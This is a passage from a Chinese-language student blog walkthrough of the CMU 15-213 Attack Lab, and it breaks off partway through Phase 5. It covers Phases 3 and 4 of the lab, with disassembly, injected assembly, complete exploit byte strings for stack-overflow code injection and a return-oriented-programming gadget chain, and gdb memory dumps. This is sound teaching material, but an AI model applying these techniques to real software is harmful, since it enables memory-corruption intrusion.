 和 <code>strncmp</code>  影响到</li>\n<li>查找 <code>cookie</code>  字符串的编码，加上一个 <code>\\0</code> ，并插入到攻击代码之前</li>\n<li>确定攻击代码的起始位置（在插入的字符串后），将其地址插入到 buffer overflow 的最后 8 个字节</li>\n</ol>\n<p>在攻击代码中所做的工作应该是：</p>\n<ol>\n<li>让 <code>%rdi = 插入字符串的起始位置</code></li>\n<li>将 <code>touch3</code>  的起始位置插入到返回地址处</li>\n<li>调用 <code>ret</code>  返回</li>\n<li>通过多个 <code>nop</code>  填充字符串（也可以不填充？）</li>\n</ol>\n<p>我们首先确定 <code>getbuf</code>  的 <code>buf</code>  范围， <code>hexmatch</code>  的辐射范围和 <code>strncmp</code>  的辐射范围。</p>\n<p>通过<a href=\"#phase-2%E5%9C%A8-buf-%E4%B8%AD%E6%8F%92%E5%85%A5%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E5%B9%B6%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80\">前文</a>我们分析过：</p>\n<ol>\n<li>调用 <code>getbuf</code>  之前:  <code>0x5561dca8</code></li>\n<li>调用 <code>getbuf</code>  之后:  <code>0x5561dca0</code></li>\n<li>调用 <code>rsp = rsp - 40</code>  之后:  <code>0x5561dc78</code></li>\n</ol>\n<p>可以了解到 <code>buf</code>  的范围是： <code>0x5561dc78 ~ 0x5561dc9f</code> ， <code>buf</code>  后 8 个字节的返回地址的位置是 <code>0x5561dca0</code> 。</p>\n<p>对 <code>touch3</code>  进行反汇编可得：</p>\n<pre><code>Dump of assembler code for function touch3:\n   0x00000000004018fa &lt;+0&gt;:     push   %rbx\n   0x00000000004018fb &lt;+1&gt;:     mov    %rdi,%rbx\n   0x00000000004018fe &lt;+4&gt;:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc &lt;vlevel&gt;\n   0x0000000000401908 &lt;+14&gt;:    mov    %rdi,%rsi\n   0x000000000040190b &lt;+17&gt;:    mov    0x202bd3(%rip),%edi        # 0x6044e4 &lt;cookie&gt;\n   0x0000000000401911 &lt;+23&gt;:    callq  0x40184c &lt;hexmatch&gt;\n   0x0000000000401916 &lt;+28&gt;:    test   %eax,%eax\n   0x0000000000401918 &lt;+30&gt;:    je     0x40193d &lt;touch3+67&gt;\n   0x000000000040191a &lt;+32&gt;:    mov    %rbx,%rdx\n   0x000000000040191d &lt;+35&gt;:    mov    $0x403138,%esi\n   0x0000000000401922 &lt;+40&gt;:    mov    $0x1,%edi\n   0x0000000000401927 &lt;+45&gt;:    mov    $0x0,%eax\n   0x000000000040192c &lt;+50&gt;:    callq  0x400df0 &lt;__printf_chk@plt&gt;\n   0x0000000000401931 &lt;+55&gt;:    mov    $0x3,%edi\n   0x0000000000401936 &lt;+60&gt;:    callq  0x401c8d &lt;validate&gt;\n   0x000000000040193b &lt;+65&gt;:    jmp    0x40195e &lt;touch3+100&gt;\n   0x000000000040193d &lt;+67&gt;:    mov    %rbx,%rdx\n   0x0000000000401940 &lt;+70&gt;:    mov    $0x403160,%esi\n   0x0000000000401945 &lt;+75&gt;:    mov    $0x1,%edi\n   0x000000000040194a &lt;+80&gt;:    mov    $0x0,%eax\n   0x000000000040194f &lt;+85&gt;:    callq  0x400df0 &lt;__printf_chk@plt&gt;\n   0x0000000000401954 &lt;+90&gt;:    mov    $0x3,%edi\n   0x0000000000401959 &lt;+95&gt;:    callq  0x401d4f &lt;fail&gt;\n   0x000000000040195e &lt;+100&gt;:   mov    $0x0,%edi\n   0x0000000000401963 &lt;+105&gt;:   callq  0x400e40 &lt;exit@plt&gt;\nEnd of assembler dump.\n</code></pre>\n<p>对 <code>hexmatch</code>  进行反汇编可得：</p>\n<pre><code>Dump of assembler code for function hexmatch:\n   0x000000000040184c &lt;+0&gt;:     push   %r12\n   0x000000000040184e &lt;+2&gt;:     push   %rbp\n   0x000000000040184f &lt;+3&gt;:     push   %rbx\n   0x0000000000401850 &lt;+4&gt;:     add    $0xffffffffffffff80,%rsp\n   0x0000000000401854 &lt;+8&gt;:     mov    %edi,%r12d\n   0x0000000000401857 &lt;+11&gt;:    mov    %rsi,%rbp\n   0x000000000040185a &lt;+14&gt;:    mov    %fs:0x28,%rax\n   0x0000000000401863 &lt;+23&gt;:    mov    %rax,0x78(%rsp)\n   0x0000000000401868 &lt;+28&gt;:    xor    %eax,%eax\n   0x000000000040186a &lt;+30&gt;:    callq  0x400db0 &lt;random@plt&gt;\n   0x000000000040186f &lt;+35&gt;:    mov    %rax,%rcx\n   0x0000000000401872 &lt;+38&gt;:    movabs $0xa3d70a3d70a3d70b,%rdx\n   0x000000000040187c &lt;+48&gt;:    imul   %rdx\n   0x000000000040187f &lt;+51&gt;:    add    %rcx,%rdx\n   0x0000000000401882 &lt;+54&gt;:    sar    $0x6,%rdx\n   0x0000000000401886 &lt;+58&gt;:    mov    %rcx,%rax\n   0x0000000000401889 &lt;+61&gt;:    sar    $0x3f,%rax\n   0x000000000040188d &lt;+65&gt;:    sub    %rax,%rdx\n   0x0000000000401890 &lt;+68&gt;:    lea    (%rdx,%rdx,4),%rax\n   0x0000000000401894 &lt;+72&gt;:    lea    (%rax,%rax,4),%rax\n   0x0000000000401898 &lt;+76&gt;:    shl    $0x2,%rax\n   0x000000000040189c &lt;+80&gt;:    sub    %rax,%rcx\n   0x000000000040189f &lt;+83&gt;:    lea    (%rsp,%rcx,1),%rbx\n   0x00000000004018a3 &lt;+87&gt;:    mov    %r12d,%r8d\n   0x00000000004018a6 &lt;+90&gt;:    mov    $0x4030e2,%ecx\n   0x00000000004018ab &lt;+95&gt;:    mov    $0xffffffffffffffff,%rdx\n   0x00000000004018b2 &lt;+102&gt;:   mov    $0x1,%esi\n   0x00000000004018b7 &lt;+107&gt;:   mov    %rbx,%rdi\n   0x00000000004018ba &lt;+110&gt;:   mov    $0x0,%eax\n   0x00000000004018bf &lt;+115&gt;:   callq  0x400e70 &lt;__sprintf_chk@plt&gt;\n   0x00000000004018c4 &lt;+120&gt;:   mov    $0x9,%edx\n   0x00000000004018c9 &lt;+125&gt;:   mov    %rbx,%rsi\n   0x00000000004018cc &lt;+128&gt;:   mov    %rbp,%rdi\n   0x00000000004018cf &lt;+131&gt;:   callq  0x400ca0 &lt;strncmp@plt&gt;\n   0x00000000004018d4 &lt;+136&gt;:   test   %eax,%eax\n   0x00000000004018d6 &lt;+138&gt;:   sete   %al\n   0x00000000004018d9 &lt;+141&gt;:   movzbl %al,%eax\n   0x00000000004018dc &lt;+144&gt;:   mov    0x78(%rsp),%rsi\n   0x00000000004018e1 &lt;+149&gt;:   xor    %fs:0x28,%rsi\n   0x00000000004018ea &lt;+158&gt;:   je     0x4018f1 &lt;hexmatch+165&gt;\n   0x00000000004018ec &lt;+160&gt;:   callq  0x400ce0 &lt;__stack_chk_fail@plt&gt;\n   0x00000000004018f1 &lt;+165&gt;:   sub    $0xffffffffffffff80,%rsp\n   0x00000000004018f5 &lt;+169&gt;:   pop    %rbx\n   0x00000000004018f6 &lt;+170&gt;:   pop    %rbp\n   0x00000000004018f7 &lt;+171&gt;:   pop    %r12\n   0x00000000004018f9 &lt;+173&gt;:   retq\nEnd of assembler dump.\n</code></pre>\n<p>对 <code>strncmp</code>  进行反汇编可得：</p>\n<pre><code>Dump of assembler code for function strncmp_ifunc:\n   0x00007ffff7e54710 &lt;+0&gt;:     endbr64\n   0x00007ffff7e54714 &lt;+4&gt;:     mov    0x14c745(%rip),%rcx        # 0x7ffff7fa0e60\n   0x00007ffff7e5471b &lt;+11&gt;:    lea    0xe4b0e(%rip),%rax        # 0x7ffff7f39230 &lt;__strncmp_avx2&gt;\n   0x00007ffff7e54722 &lt;+18&gt;:    movabs $0x90000000002,%rdx\n   0x00007ffff7e5472c &lt;+28&gt;:    movabs $0x10000000002,%rsi\n   0x00007ffff7e54736 &lt;+38&gt;:    and    0xc8(%rcx),%rdx\n   0x00007ffff7e5473d &lt;+45&gt;:    cmp    %rsi,%rdx\n   0x00007ffff7e54740 &lt;+48&gt;:    je     0x7ffff7e54772 &lt;strncmp_ifunc+98&gt;\n   0x00007ffff7e54742 &lt;+50&gt;:    mov    0x70(%rcx),%edx\n   0x00007ffff7e54745 &lt;+53&gt;:    test   $0x100000,%edx\n   0x00007ffff7e5474b &lt;+59&gt;:    je     0x7ffff7e5475d &lt;strncmp_ifunc+77&gt;\n   0x00007ffff7e5474d &lt;+61&gt;:    lea    0xdf78c(%rip),%rax        # 0x7ffff7f33ee0 &lt;__strncmp_sse42&gt;\n   0x00007ffff7e54754 &lt;+68&gt;:    testb  $0x80,0xcc(%rcx)\n   0x00007ffff7e5475b &lt;+75&gt;:    je     0x7ffff7e54772 &lt;strncmp_ifunc+98&gt;\n   0x00007ffff7e5475d &lt;+77&gt;:    and    $0x2,%dh\n   0x00007ffff7e54760 &lt;+80&gt;:    lea    0xaef9(%rip),%rax        # 0x7ffff7e5f660 &lt;__strncmp_sse2&gt;\n   0x00007ffff7e54767 &lt;+87&gt;:    lea    0xc51a2(%rip),%rdx        # 0x7ffff7f19910 &lt;__strncmp_ssse3&gt;\n   0x00007ffff7e5476e &lt;+94&gt;:    cmovne %rdx,%rax\n   0x00007ffff7e54772 &lt;+98&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>其中与栈相关的指令包括：</p>\n<pre><code>hex2match前(touch3中)：\n    push   %rbx\n    callq hex2match\nhex2match:\n   0x000000000040184c &lt;+0&gt;:     push   %r12\n   0x000000000040184e &lt;+2&gt;:     push   %rbp\n   0x000000000040184f &lt;+3&gt;:     push   %rbx\n\n   0x00000000004018f5 &lt;+169&gt;:   pop    %rbx\n   0x00000000004018f6 &lt;+170&gt;:   pop    %rbp\n   0x00000000004018f7 &lt;+171&gt;:   pop    %r12\n                                retq\nhex2match后：\n    callq strncmp\nstrncmp:\n    retq\n</code></pre>\n<p>由于 <code>hexmatch</code>  和 <code>strncmp</code>  是在 <code>touch3</code>  里面调用的，而 <code>touch3</code>  是在执行攻击代码之后调用，在攻击代码中我们将 <code>%rdi</code>  指向字符串的地址，因此我们需要保证的是 <code>touch3</code>  中的 <code>push</code>  和 <code>pop</code>  指令不影响之前的字符串，以免影响 <code>%rdi</code>  指向的值。</p>\n<p>在调用 <code>touch3</code>  之前，我们刚刚执行了 <code>ret</code>  指令，其作用是将返回地址赋值给 <code>%rip</code>  并弹出，操作完成后 <code>%rsp</code>  应该在 <code>buf + 48</code>  位置处。我们是通过直接返回到 <code>touch3</code>  的开头位置来执行 <code>touch3</code>  的，而不是 <code>callq touch3</code> ，因此无需往栈中压入下一条指令的地址（当然这里也没有下一条啦～）</p>\n<p>通过上述过程分析我们可以看到，栈的最低位置应该是在经过了一下几个步骤之后：</p>\n<ol>\n<li><code>push %rbx</code> ，这里压入了 rbx，栈位置来到了 <code>buf + 40</code></li>\n<li><code>callq hex2match</code> ，这里压入了 <code>callq</code>  的下一条指令的地址，栈位置来到了 <code>buf + 32</code></li>\n<li><code>push r12</code> ，压入了 <code>r12</code> ，栈位置来到了 <code>buf + 24</code></li>\n<li><code>push rbp</code> ，压入了 <code>rbp</code> ，栈位置来到了 <code>buf + 16</code></li>\n<li><code>push rbx</code> ，压入了 <code>rbx</code> ，栈位置来到了 <code>buf + 8</code></li>\n</ol>\n<p>后续主要执行的都是 <code>pop</code>  和 <code>retq</code>  操作，虽然有一个 <code>callq strncmp</code> ，但是栈的位置不可能低于 <code>buf + 8</code> 。因此我们插入的字符串必须在 <code>buf + 8</code>  之前。我们输入的字符串刚好是 8 个字符，1 个字符一个字节，也刚好是 8 个字节，那么就应当插在 <code>buf</code>  处。从 <code>buf + 8</code>  处开始插入攻击代码。</p>\n<p>此外：</p>\n<ol>\n<li><code>59b997fa</code>  的字符串编码应该是： <code>0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61</code> （插在攻击代码前）</li>\n<li><code>buf + 8</code>  处的地址是： <code>0x5561dc80</code> （插入返回地址部分），转化成小端法应该是 <code>80 dc 61 55</code></li>\n<li><code>touch3</code>  的地址是 <code>0x4018fa</code></li>\n</ol>\n<p>那么我们的攻击指令应该是：</p>\n<pre><code>movl $0x5561dc78,%edi\nsubq $0x8,%rsp\nmovl $0x4018fa,(%rsp)\nret\n</code></pre>\n<p>将其放入 <code>ph3.s</code>  中，输入 <code>gcc -c ph3.s</code>  得到 <code>ph3.o</code> ，输入 <code>objdump -d ph3.o &gt; ph3.d</code> ，得到 <code>ph3.d</code>  文件如下：</p>\n<pre><code>\nph3.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;.text&gt;:\n   0:\tbf 78 dc 61 55       \tmov    $0x5561dc78,%edi\n   5:\t48 83 ec 08          \tsub    $0x8,%rsp\n   9:\tc7 04 24 fa 18 40 00 \tmovl   $0x4018fa,(%rsp)\n  10:\tc3                   \tretq\n  11:\t90                   \tnop\n  12:\t90                   \tnop\n  13:\t90                   \tnop\n  14:\t90                   \tnop\n\n</code></pre>\n<p>那么其字节应该是 <code>bf 78 dc 61 55 48 83 ec 08 c7 04 24 fa 18 40 00 c3</code> 。一共 17 个字节，加上最前面 8 个字节，一共 25 个字节。最后插入 15 个字节的 <code>nop</code> 。<br>\n执行过程中内存情况如下：</p>\n<pre><code>(gdb) x/48xb 0x5561dc78\n0x5561dc78:     0x35    0x39    0x62    0x39    0x39    0x37    0x66    0x61\n0x5561dc80:     0xbf    0x78    0xdc    0x61    0x55    0x48    0x83    0xec\n0x5561dc88:     0x08    0xc7    0x04    0x24    0xfa    0x18    0x40    0x00\n0x5561dc90:     0xc3    0x90    0x90    0x90    0x90    0x90    0x90    0x90\n0x5561dc98:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90\n0x5561dca0:     0x80    0xdc    0x61    0x55    0x00    0x00    0x00    0x00\n</code></pre>\n<p>而这里我们打印值后发现我们的 <code>%edi</code>  所指向的字符串如下：</p>\n<pre><code>(gdb) x/s $rdi\n0x5561dc78:     &quot;59b997fa\\277x\\334aUH\\203\\354\\b\\307\\004$\\372\\030@&quot;\n</code></pre>\n<p>而 <code>cookie</code>  的值如下：</p>\n<pre><code>(gdb) p /x cookie\n$14 = 0x59b997fa\n</code></pre>\n<p>但是后来这个 <code>buf</code>  的空间就变成了这样：</p>\n<pre><code>5: x/48xb 0x5561dc78\n0x5561dc78:     0x00    0x2e    0x40    0xcb    0xed    0x3e    0x25    0xb2\n0x5561dc80:     0x78    0xdc    0x61    0x55    0x00    0x00    0x00    0x00\n0x5561dc88:     0xe8    0x5f    0x68    0x55    0x00    0x00    0x00    0x00\n0x5561dc90:     0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x5561dc98:     0x16    0x19    0x40    0x00    0x00    0x00    0x00    0x00\n0x5561dca0:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00\n</code></pre>\n<p>但是我们后来发现，这里栈的内容被完全改变了，而且字符串的后面忘了加 <code>\\0</code>  字符。所以这里是有一些问题的。</p>\n<h4 id=\"正确的解答\"><a class=\"markdownIt-Anchor\" href=\"#正确的解答\">#</a> 正确的解答</h4>\n<p>经过查阅一些<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MDcyNDk0OA==\">网上的资料</span>发现，我在阅读 C 语言代码的时候忽略了这 2 行：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> cbuf<span class=\"token punctuation\">[</span><span class=\"token number\">110</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/* Make position of check string unpredictable */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s <span class=\"token operator\">=</span> cbuf <span class=\"token operator\">+</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>那么 <code>hexmatch</code>  和 <code>strncmp</code>  中分配的空间就是随机的。那么我们所做出的改变应该是让插入的字符串放在父函数 <code>test</code>  的位置，然后让 <code>%rdi</code>  指向 <code>test</code>  栈空间中的位置。 <code>test</code>  函数的位置在返回地址下面，那么应该是 <code>buf + 48</code>  即 <code>0x5561dca8</code> 。其字符 <code>bf 78 dc 61 55 48 83 ec 00</code>  应该在返回地址后面。而攻击代码也应该改为：</p>\n<pre><code>movl $0x5561dca8,%edi\nsubq $0x8,%rsp\nmovl $0x4018fa,(%rsp)\nret\n</code></pre>\n<p>中间两行代码可以改为 <code>pushq $0x4018fa</code> 。由此，我们在 <code>ph3.s</code>  中放入如下内容：</p>\n<pre><code>movl $0x5561dca8,%edi\npushq $0x4018fa\nret\n</code></pre>\n<p>后续步骤和前述一样，我们生成其汇编代码：</p>\n<pre><code>\nph3.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;.text&gt;:\n   0:\tbf a0 dc 61 55       \tmov    $0x5561dca8,%edi\n   5:\t68 fa 18 40 00       \tpushq  $0x4018fa\n   a:\tc3                   \tretq\n   b:\t90                   \tnop\n   c:\t90                   \tnop\n   d:\t90                   \tnop\n   e:\t90                   \tnop\n</code></pre>\n<p>这次我们不把汇编代码插入 <code>buf + 8</code>  了，因为没有意义，我们直接将其插入汇编代码开头即可。最后的 8 个字节返回地址改为 <code>0x5561dc78</code> 。其前面的内容为 <code>bf a0 dc 61 55 68 fa 18 40 00 c3</code> ，共 11 个字节。插入 29 个 <code>nop</code>  (0x90)。在插入 8 个字节的返回地址（ <code>0x000000005561dc78</code> ）。最后放入 9 个字节的字符串 <code>0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61 0x00</code> 。最后结果如下：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Cookie: 0x59b997fa</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Type string:Touch3<span class=\"token operator\">!</span>: You called touch3<span class=\"token punctuation\">(</span><span class=\"token string\">\"59b997fa\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Valid solution <span class=\"token keyword\">for</span> level <span class=\"token number\">3</span> with target ctarget</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>PASS: Would have posted the following:</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        user <span class=\"token function\">id</span> bovik</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        course  <span class=\"token number\">15213</span>-f15</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        lab     attacklab</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        result  <span class=\"token number\">1</span>:PASS:0xffffffff:ctarget:3:BF A8 DC <span class=\"token number\">61</span> <span class=\"token number\">55</span> <span class=\"token number\">68</span> FA <span class=\"token number\">18</span> <span class=\"token number\">40</span> 00 C3 <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">90</span> <span class=\"token number\">78</span> DC <span class=\"token number\">61</span> <span class=\"token number\">55</span> 00 00 00 00 <span class=\"token number\">35</span> <span class=\"token number\">39</span> <span class=\"token number\">62</span> <span class=\"token number\">39</span> <span class=\"token number\">39</span> <span class=\"token number\">37</span> <span class=\"token number\">66</span> <span class=\"token number\">61</span> 00</pre></td></tr></table></figure><p>通过！</p>\n<h2 id=\"part-ii-return-oriented-programming-attack\"><a class=\"markdownIt-Anchor\" href=\"#part-ii-return-oriented-programming-attack\">#</a> Part II: Return oriented Programming attack</h2>\n<p><code>rtarget</code>  的攻击要比 <code>ctarget</code>  难一些，因为：</p>\n<ol>\n<li>开启了栈随机化，程序的地址难以预测</li>\n<li>开启了 Non-executable 位，导致我们插入的代码部分难以执行</li>\n</ol>\n<p>因此，我们使用一种新的方法：return oriented programming attacks。它的核心在于利用已有的程序，而不是注入代码。每个 gadget 是一个代码段，每个 gadget 的最后都是 <code>ret</code>  指令（编码 <code>c3</code> ），将这个自己和其前面的部分字节组合起来，可以合成我们想要的指令。此外，针对 x86_64，我们不一定要利用整条指令，有的时候一条指令的一部分字节又可以组成另一条指令。所有 gadget 的地址被压在栈上，每次调用 <code>ret</code>  之后就会返回到下一个 gadget 的地址。</p>\n<h3 id=\"phase-4\"><a class=\"markdownIt-Anchor\" href=\"#phase-4\">#</a> Phase 4</h3>\n<p>利用 <code>rop</code>  重做 Phase 2 的实验，可以使用 <code>movq, popq, ret, nop</code>  指令以及前 8 个寄存器 ( <code>%rax–%rdi</code> )<br>\n 提示：</p>\n<ol>\n<li>可以在 <code>start_farm</code>  和 <code>mid_farm</code>  之间寻找 gadget</li>\n<li>可以只使用 2 个 gadget</li>\n<li>当一个 gadget 使用 <code>popq</code>  指令时，它从栈上弹出一个数值，所以你的攻击字符串可以是 gadget 地址和数值的组合。</li>\n</ol>\n<p>Phase 2 的目的是让 <code>test()</code>  跳转到 <code>touch2</code>  函数，并且需要让 <code>%edi</code>  的值等于 <code>cookie</code>  的值。</p>\n<p>我们当时做题的主要过程是：</p>\n<ol>\n<li>让最后的转移地址为 <code>buf</code>  开头的位置 ( <code>0x5561dc78</code> )</li>\n<li>在 <code>buf</code>  中存储攻击指令\n<ol>\n<li>让 <code>%edi = *0x6054e4</code></li>\n<li>将 <code>touch2</code>  的地址压入栈中， <code>pushq 0x4017ec</code></li>\n</ol>\n</li>\n<li>调用 <code>ret</code>  返回</li>\n</ol>\n<p>我们在 phase 2 中需要插入的代码是：</p>\n<pre><code>    movq $0x6054e4,%rax\n    movq (%rax),%rdi\n    subq $0x8,%rsp\n    movq $0x4017ec,(%rsp)\n    ret\n</code></pre>\n<p>这里的变化在于，我们不需要使用 <code>buf</code>  来存储攻击指令了，而是在整个程序中寻找攻击指令。把第一个 gadget 的地址放在返回地址处，把第二个 gadget 的地址放在第一个 gadget 后面。以此类推。我们的目的是找到所有的 gadget。</p>\n<p>但是其实这段代码可以通过把 <code>0x6054e4</code>  和 <code>0x6017ec</code>  两个值压在栈上。首先利用一个 <code>popq</code>  指令将其弹出到 <code>%rax</code>  中，然后将 <code>%rax</code>  处的值移动到 <code>%rdi</code>  上。我们可以这样设计栈帧：</p>\n<p><img data-src=\"frame.png\" alt=\"frame.png\"></p>\n<p>第一个 <code>gadget</code>  中的代码是：</p>\n<pre><code>movq %rsp, %rxx\npopq %rax\nmovq (%rax),%rdi\n</code></pre>\n<p>第二个 <code>gadget</code>  中的代码是：</p>\n<pre><code>popq %rax\nmovq %rax,(%rxx)\n</code></pre>\n<p>使用 <code>popq %rax</code>  是因为， <code>popq</code>  有 8 种可能的结果，而只有 <code>popq %rax</code>  出现在代码的字节中，因此我们从这里出发。我们翻译一下 <code>movq (%rax),%rdi</code> ，其字节编码为 <code>48 8b 38</code> 。</p>\n<p>但是我们发现其实不用那么麻烦，也就是说不用保存之前的 <code>%rsp</code> ，这是因为我们可以通过 <code>gadget</code>  中的 <code>ret</code>  指令弹出后 8 个字节的地址并且首先跳转，那么就无需把 <code>touch3</code>  的地址保存在最开始的部分。栈空间可以简化成如下情况：</p>\n<p><img data-src=\"frame1.png\" alt=\"frame1.png\"></p>\n<p>但是我们发现一个问题，就是 <code>movq (%rax),%rdi</code>  这条指令所对应的字节在源程序中找不到，因此我们需要采取一个更加优化的办法，就是不在栈上保存 <code>cookie</code>  的地址，而是直接保存 <code>cookie</code>  的值， <code>cookie</code>  的值为 <code>0x59b997fa</code> ，那么栈空间可以简化成如下情况：</p>\n<p><img data-src=\"frame3.png\" alt=\"frame3.png\"></p>\n<p>这样只需要两条指令就可以做到了。这两条指令的编码是</p>\n<pre><code>\ngadget.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;.text&gt;:\n   0:\t58                   \tpop    %rax\n   1:\t48 89 c7             \tmov    %rax,%rdi\n\n</code></pre>\n<p>但是这两条指令我们无法在同一处找到，因此需要划分为 2 个 <code>gadget</code> 。且两条后面的都必须接数个 <code>90</code> （ <code>nop</code> ）加上一个 <code>c3</code> 。</p>\n<p>第一个的地址是 <code>4019ab</code>  或 <code>4019cc</code> 。第二个的地址是 <code>4019a2</code>  或者 <code>4019c5</code> 。</p>\n<p>我们这里使用 <code>4019ab</code>  和 <code>4019a2</code>  两个 <code>gadget</code> 。第一个中存储 <code>pop %rax</code>  指令，第二个中存储 <code>mov %rax, %rdi</code>  指令。最后的栈空间如下：</p>\n<p><img data-src=\"frame-last.png\" alt=\"frame-last.png\"></p>\n<p>由此，输入的攻击字符串的前 40 个字节随意，后面 32 个字节根据上述栈情况为（注意应该用小端法）</p>\n<pre><code>ab 19 40 00 00 00 00 00\nfa 97 b9 59 00 00 00 00\na2 19 40 00 00 00 00 00\nec 17 40 00 00 00 00 00\n</code></pre>\n<blockquote>\n<p>刚刚差点把 gadget1 和 2 的地址搞反了，导致跑出来 segmentation fault，还疑惑是怎么回事，后来一看发现不好，哈哈哈哈，做题的时候还是要认真仔细嗷！</p>\n</blockquote>\n<p>输入 <code>./hex2raw &lt; phase4.txt | ./rtarget -q</code> （注意不要输入成 <code>ctarget</code>  啦！），运行结果如下：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gwen@gwen-virtual-machine:~/Documents/report/code/15213/lab/lab3-attack-lab$ ./hex2raw <span class=\"token operator\">&lt;</span> phase4.txt <span class=\"token operator\">|</span> ./rtarget <span class=\"token parameter variable\">-q</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Cookie: 0x59b997fa</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Type string:Touch2<span class=\"token operator\">!</span>: You called touch2<span class=\"token punctuation\">(</span>0x59b997fa<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Valid solution <span class=\"token keyword\">for</span> level <span class=\"token number\">2</span> with target rtarget</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>PASS: Would have posted the following:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        user <span class=\"token function\">id</span> bovik</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        course  <span class=\"token number\">15213</span>-f15</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        lab     attacklab</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        result  <span class=\"token number\">1</span>:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB <span class=\"token number\">19</span> <span class=\"token number\">40</span> 00 00 00 00 00 FA <span class=\"token number\">97</span> B9 <span class=\"token number\">59</span> 00 00 00 00 A2 <span class=\"token number\">19</span> <span class=\"token number\">40</span> 00 00 00 00 00 EC <span class=\"token number\">17</span> <span class=\"token number\">40</span> 00 00 00 00 00</pre></td></tr></table></figure><h3 id=\"phase-5\"><a class=\"markdownIt-Anchor\" href=\"#phase-5\">#</a> Phase 5</h3>\n<p>phase 5 的任务是让 <code>%rdi</code>  指向 <code>cookie</code>  的字符串表示并调用 <code>touch 3</code> ，这个任务看起来有点类似我们在 Phase 3 中做的工作。</p>\n<p>作者提示：</p>\n<ol>\n<li>可使用的 <code>gadget</code>  的范围是 <code>start_farm</code>  到 <code>end_farm</code></li>\n<li>利用 Appendix 中的表</li>\n<li>复习一下课本 P83 的 <code>movl</code>  的用法</li>\n<li>官方答案使用了 8 个 gadget</li>\n</ol>\n<p>在 Phase 3 中我们所做的工作是：</p>\n<ol>\n<li>插入攻击字符串在攻击代码前</li>\n<li>在返回地址处插入攻击代码的起始位置</li>\n<li>在攻击代码中实现如下操作：\n<ol>\n<li>将攻击字符串的地址赋值给 <code>%rdi</code></li>\n<li>将 <code>touch3</code>  的返回地址压入返回地址处</li>\n</ol>\n</li>\n</ol>\n<p>现在使用 <code>rop</code>  后的问题在于：攻击字符串压到哪？现在栈上是返回地址和字符串的组合。那么我们的想法是让攻击字符串放在所有 gadget 地址之后。但是具体放在之后多少呢？这要看 <code>mov xxx, %rdi</code>  中哪些地址的编码存在。</p>\n<p>首先， <code>cookie</code>  的值是 <code>59b997fa</code> ，那么其字符串编码是 <code>0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61 0x00</code> ( <code>0x00</code>  是字符串最后的 <code>\\0</code> )。那么我们构建的 <code>gadget</code>  中应有的步骤是：</p>\n<ol>\n<li><code>mov 地址,%rdi</code></li>\n<li><code>ret</code></li>\n</ol>\n<p>此外， <code>touch3</code>  的地址是 <code>0x4018fa</code> 。那么我们最初设计的栈空间如图：</p>\n<p><img data-src=\"phase5.png\" alt=\"phase5.png\"></p>\n<p>但是我后来有点卡壳了，问题在于把字符串存在什么位置呢？如果存在那个位置，在 <code>rtarget</code>  汇编中能找到对应的 